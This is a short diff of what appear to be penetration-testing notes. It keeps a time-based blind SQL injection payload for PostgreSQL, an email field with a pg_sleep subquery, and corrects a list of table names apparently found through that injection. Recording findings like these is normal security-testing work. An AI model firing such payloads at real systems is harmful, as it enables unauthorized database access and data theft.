@@ -6,8 +6,8 @@
 payload `asd%40me.c'||+(SELECT+pg_sleep(10)::text)||'`
 
 tables:
-| user    |
-| user_r? |
+| users    |
+| user_roles |
 | forgot  |
 | roles  
 
